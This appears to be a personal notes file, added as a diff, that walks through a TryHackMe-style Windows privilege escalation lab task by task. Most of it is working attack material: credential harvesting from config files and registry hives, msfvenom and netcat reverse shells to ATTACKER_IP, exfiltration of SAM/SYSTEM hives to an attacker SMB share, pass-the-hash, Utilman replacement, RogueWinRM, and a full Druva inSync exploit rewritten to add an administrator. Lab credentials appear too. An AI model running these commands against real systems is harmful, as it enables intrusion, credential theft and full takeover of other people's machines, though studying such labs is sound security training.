@@ -1,0 +1,375 @@
+__________________________________________________________________________________________
+
+
+TASK 3:  Harvesting Passwords from Usual Spots
+
+Unattended Windows Installations allows a single operating system image to be deployed to several hosts through the network.    C:\Unattend.xml
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\Panther\Unattend\Unattend.xml
+    C:\Windows\system32\sysprep.inf
+    C:\Windows\system32\sysprep\sysprep.xml
+    As part of these files, you might encounter credentials:
+    <Credentials>
+        <Username>Administrator</Username>
+        <domain>thm.local</domain>
+        <Password>Hello123</Password>
+    </Credentials>
+
+cmd.exe prompt history:
+    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+list saved credentials:
+    cmdkey /list
+
+see actual password:
+    runas /savecred /user:admin cmd.exe
+
+IIS Configuration:
+    Internet Information Services (IIS) is the default web server on Windows installations.
+    We can find web.config which stores passwords for databases or configured authentication mechanismsat:
+        C:\inetpub\wwwroot\web.config
+        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+
+    Here is a quick way to find database connection strings on the file:
+        type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+Retrieve Credentials from Software: PuTTY
+    PuTTY is an SSH client commonly found on Windows systems.
+    Stores proxy configurations that include cleartext authentication credentials.
+        reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
+__________________________________________________________________________________________
+
+
+TASK 4: Other Quick Wins 
+
+Scheduled Tasks
+
+    Looking into scheduled tasks on the target system
+        schtasks /query /tn vulntask /fo list /v
+    Check the file permissions on the executable, we use icacls:
+        icacls c:\tasks\schtask.bat
+    The BUILTIN\Users group has full access (F) over the task's binary. 
+    This means we can modify the .bat file and insert any payload we like.
+        echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+    Start listener on AttackBox
+        nc -lvp 1234
+    The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges.
+    In this scenario, we have permissions to start the task manually to save some time.
+        schtasks /run /tn vulntask
+    
+AlwaysInstallElevated
+
+    Windows installer (.msi) files can be configured to run with elevated privileges, 
+    allowing unprivileged users to execute malicious MSI files with admin rights.
+    This method requires two registry values to be set.
+        C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+        C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+    Generate malicous .msi file from AttackBox:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+    Get the .msi file from AttackBox and run on VICTIM
+        msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+__________________________________________________________________________________________
+
+
+TASK 5: Abusing Service Misconfigurations
+
+Window Services
+
+    Service Control Manager (SCM)
+        The SCM is a process in charge of managing the state of services as needed, 
+        checking the current status of any given service and generally providing a way to configure services.
+
+    See spphost service configurations: 
+        sc qc apphostsvc
+
+    Discretionary Access Control List (DACL): 
+        Indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges
+
+    All of the services configurations are stored on the registry under: 
+        HKLM\SYSTEM\CurrentControlSet\Services
+
+Insecure Permissions on Service Executable
+
+    If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, 
+    the attacker can gain the privileges of the service's account trivially.
+
+    Let's look at a vulnerability found on Splinterware System Scheduler.
+        To check service configuration of WindowScheduler:
+            sc qc WindowsScheduler
+        The service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in C:\Progra~2\System~1\WService.exe. 
+
+        We then proceed to check the permissions on the executable:
+            icacls C:\Progra~2\System~1\WService.exe
+        We found that the Everyone group has modify permissions (M) on the service's executable. 
+
+        Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe-service -o rev-svc.exe
+            python3 -m http.server
+        Pull the payload from PowerShell
+            wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+        Replace the executable with payload, and grant permission to Everyone group
+            cd C:\PROGRA~2\SYSTEM~1\
+            move WService.exe WService.exe.bkp
+            move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+            icacls WService.exe /grant Everyone:F
+        Start listener on AttackBox
+            nc -lvp 1234
+        Restart the service on VICTIM
+            sc stop windowsscheduler
+            sc start windowsscheduler
+        Note: PowerShell has sc as an alias to Set-Content, use sc.exe instead.
+
+Unquoted Service Paths
+
+    When we can't directly write into service executables as before, 
+    there might still be a chance to force a service into running arbitrary executables 
+    when the service is configured to point to an "unquoted" executable. 
+    By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
+    
+    Let's say by running sc qc "disk sorter enterprise":
+        1. First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
+        2. If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
+        3. If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.
+    If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
+
+    Most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, 
+    which isn't writable by unprivileged users. 
+    Some installers change the permissions on the installed folders, making the services vulnerable. 
+
+    In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. 
+    By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. 
+    We can check this using icacls:
+        icacls c:\MyPrograms
+    Notice the BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files
+
+    Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe-service -o rev-svc2.exe
+        python3 -m http.server
+    Pull the payload from PowerShell
+        wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc2.exe
+    Replace the executable with payload, and grant permission to Everyone group
+        move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+        C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+    Start listener on AttackBox
+        nc -lvp 1234
+    Restart the service on VICTIM
+        sc stop "disk sorter enterprise"
+        sc start "disk sorter enterprise"
+
+Insecure Service Permissions
+
+    If the service's executable DACL is secure and the binary path is quoted, 
+    you can still exploit the service if its DACL allows configuration changes. 
+    This lets you reconfigure the service to run any executable with elevated privileges, including SYSTEM.
+
+    To check for a service DACL from the command line, it's available at C:\\tools. 
+    The command to check for the thmservice service DACL is:
+        C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+    Notice that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
+
+    Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1234 -f exe-service -o rev-svc3.exe
+        python3 -m http.server
+    Pull the payload from PowerShell
+        wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc3.exe
+    Grant permission to Everyone group
+        icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+    Change the service's associated executable and account
+        sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+    Start listener on AttackBox
+        nc -lvp 1234
+    Restart the service on VICTIM
+        sc stop THMService
+        sc start THMService
+
+__________________________________________________________________________________________
+
+
+TASK 6: Abusing Dangerous privileges 
+
+SeBackup / SeRestore
+
+    SeBackup and SeRestore privileges allow bypassing DACLs to read/write any file. 
+    Attackers can exploit this to escalate privileges, e.g., by copying SAM and SYSTEM registry hives to extract the Administrator's password hash.
+
+    Check user privileges with:
+        C:\> whoami /priv
+    Backup the SAM and SYSTEM hashes
+        C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+        C:\> reg save hklm\sam C:\UsersTHMBackup\sam.hive
+    This will create a couple of files with the registry hives content. 
+    We can now copy these files to our attacker machine using SMB or any other available method. 
+    For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
+        user@attackerpc$ mkdir share
+        user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+    This creates a share named 'public' requiring the current Windows session's username and password. 
+    Use the copy command to transfer both files to the AttackBox:
+        C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+        C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+    And use impacket to retrieve the users' password hashes:
+        user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+    Use the Administrator's hash to perform a Pass-the-Hash attack and gain SYSTEM privileges:
+        user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.49.170.148
+
+SeTakeOwnership
+
+    SeTakeOwnership allows taking ownership of any object, such as files or registry keys. 
+    Attackers can exploit this to elevate privileges, e.g., by taking ownership of a service's executable running as SYSTEM.
+
+    Check user privileges with:
+        C:\> whoami /priv
+    This time, we abuse utilman.exe to escalate privileges. 
+    Utilman runs with SYSTEM privileges, so replacing it with a payload grants SYSTEM access. Take ownership of utilman.exe:
+        C:\> takeown /f C:\Windows\System32\Utilman.exe
+    Being the owner of a file doesn't grant privileges, but you can assign yourself full permissions using:
+        C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+    After this, we will replace utilman.exe with a copy of cmd.exe:
+        C:\Windows\System32\> copy cmd.exe utilman.exe
+    To trigger utilman, we will lock our screen from the start button:
+    Click the "Ease of Access" button to run utilman.exe (now cmd.exe), granting a SYSTEM-level command prompt.
+
+SeImpersonate / SeAssignPrimaryToken
+
+    These privileges allow a process to impersonate other users and act on their behalf, such as spawning processes under another user's security context. 
+    For example, an FTP server uses impersonation to restrict users to their own files. 
+    Without it, the server would access files with its own token instead of the user's.
+
+    Using the FTP user's token has drawbacks: 
+    - Files must be accessible to the FTP user, requiring manual DACL configuration. 
+    - The OS sees all files accessed by the FTP user, complicating authorization delegation. 
+    - If compromised, attackers gain access to all folders the FTP user can access.
+
+    With SeImpersonate or SeAssignPrimaryToken privileges, the FTP service can use the user's token to perform tasks on their behalf, simplifying access control.
+
+    If user Ann logs in to the FTP service and the ftp user has impersonation privileges, it can use Ann's token to access her files. 
+    The OS handles authorization, restricting access to other users' files like Jude's or Bill's.
+
+    Attackers controlling a process with SeImpersonate or SeAssignPrimaryToken privileges can impersonate any user connecting to it. 
+    LOCAL SERVICE, NETWORK SERVICE, and IIS accounts (e.g., "iis apppool\defaultapppool") often have these privileges.
+
+    To exploit this, attackers must:
+    1. Spawn a process for user connections.
+    2. Force privileged users to connect to it.
+
+    Using RogueWinRM, attackers can achieve both. Assume we compromised an IIS website and planted a web shell at:
+    http://10.49.170.148/
+    We can use the web shell to verify the compromised account's privileges, whoami /priv
+
+    Upload RogueWinRM to the target (already in C:\tools\). 
+    The exploit works because starting the BITS service creates a SYSTEM-level connection to port 5985 (used by WinRM). 
+    If WinRM isn't running, attackers can start a fake service on port 5985, intercept the connection, and execute commands as SYSTEM using SeImpersonate privileges.
+
+    Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
+        user@attackerpc$ nc -lvp 4442
+    And then, use our web shell to trigger the RogueWinRM exploit using the following command:
+        c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+    Note: The exploit may take up to 2 minutes as it waits for the BITS service to stop before restarting. 
+          The BITS service stops automatically after 2 minutes.
+    The -p parameter specifies the exploit's executable (nc64.exe), and -a passes its arguments. 
+    Here, nc64 establishes a reverse shell to ATTACKER_IP on port 4442 using -e cmd.exe.
+    If all was correctly set up, you should expect a shell with SYSTEM privileges:
+        user@attackerpc$ nc -lvp 4442
+
+__________________________________________________________________________________________
+
+
+TASK 7: Abusing Vulnerable Software 
+
+Unpatched Software
+
+    Outdated software on the target system can provide privilege escalation opportunities. 
+    Use the wmic tool to list installed software and versions. 
+    The command below gathers this information (may take a minute): 
+        wmic product get name,version,vendor
+    The `wmic product` command may not list all installed programs. Some software might not appear depending on installation methods. 
+    Check desktop shortcuts, services, or other traces for additional software. 
+    Use exploit-db, packet storm, or Google to search for known vulnerabilities in the gathered product versions.
+
+    Using wmic and Google, can you find a known vulnerability on any installed product? 
+    Use the gathered product names and versions to search for CVEs or exploits on platforms like exploit-db or packet storm.
+
+Case Study: Druva inSync 6.6.3
+
+    Druva inSync 6.6.3 is vulnerable to privilege escalation due to an RPC server running on port 6064 with SYSTEM privileges. 
+    Procedure 5 allows arbitrary command execution. 
+    A patch restricted commands to `C:\ProgramData\Druva\inSync4\`, but path traversal (e.g., `..\..\..\Windows\System32\cmd.exe`) bypasses this, 
+    enabling unauthorized command execution.
+
+    Originally published by Matteo Malvica, the following exploit can be used on the target machine to escalate privileges and retrieve the task's flag. Here is the original exploit's code:
+        $ErrorActionPreference = "Stop"
+        $cmd = "net user pwnd /add"
+
+        $s = New-Object System.Net.Sockets.Socket(
+            [System.Net.Sockets.AddressFamily]::InterNetwork,
+            [System.Net.Sockets.SocketType]::Stream,
+            [System.Net.Sockets.ProtocolType]::Tcp
+        )
+        $s.Connect("127.0.0.1", 6064)
+
+        $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+        $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+        $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+        $length = [System.BitConverter]::GetBytes($command.Length);
+
+        $s.Send($header)
+        $s.Send($rpcType)
+        $s.Send($length)
+        $s.Send($command)
+
+    Execute the exploit by pasting it into a PowerShell console (also available at C:\tools\Druva_inSync_exploit.txt). 
+    The default payload creates a user named "pwnd" without admin privileges. 
+    Modify the $cmd variable to execute a more useful command for this task.
+        $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+    This creates user "pwnd" with password "SimplePass123" and adds it to the administrators' group. Verify success with: net user pwnd.
+        PS C:\> net user pwnd
+    Run CMD by admininstrator, choose pwnd, done.
+
+
+__________________________________________________________________________________________
+
+
+TASK 8: Tools of Trade 
+
+    Below are a few tools commonly used to identify privilege escalation vectors.
+
+    WinPEAS
+        WinPEAS is a tool for enumerating privilege escalation paths on Windows systems. 
+        It runs various checks and outputs findings. Redirect its output to a file for easier analysis:
+            C:\> winpeas.exe > outputfile.txt
+
+    PrivescCheck
+        PrivescCheck is a PowerShell script for identifying privilege escalation vectors. 
+        It provides an alternative to WinPEAS without requiring a binary. 
+        To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. 
+            PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
+            PS C:\> . .\PrivescCheck.ps1
+            PS C:\> Invoke-PrivescCheck
+
+    WES-NG: Windows Exploit Suggester - Next Generation
+
+        Some scripts like winPEAS need to be uploaded and run on the target, risking antivirus detection. 
+        To minimize noise, consider using WES-NG, a pyhton script, which runs on your attacking machine.
+        Once installed, and before using it, run the command below to update the database. 
+        Update the database to check for missing patches that may allow privilege escalation:
+            wes.py --update
+        To use the script, you will need to run the systeminfo command on the target system. 
+        Do not forget to direct the output to a .txt file you will need to move to your attacking machine.
+        Once this is done, wes.py can be run as follows;
+            user@kali$ wes.py systeminfo.txt
+
+    Metasploit
+        If you have a Meterpreter shell, use the `multi/recon/local_exploit_suggester` module to identify potential privilege escalation vulnerabilities.
+
+__________________________________________________________________________________________
+
+
+Appendix:
+
+    SAM (Security Accounts Manager) and SYSTEM registry hives are critical components in Windows for managing user accounts and system security. 
+    SAM: contains user account information, including hashed passwords.
+    SYSTEM hive contains configuration settings for the system, including information about installed hardware and services.
+    DACL Discretionary Access Control Lists are used by Windows systems to specify who can access a given resource. While they are often referenced when talking about files, they also apply to other components as registry keys, services and scheduled tasks.
+    RDP command: xfreerdp3 /u:thm-unpriv /p:Password321 /v:10.49.148.17 /dynamic-resolution 
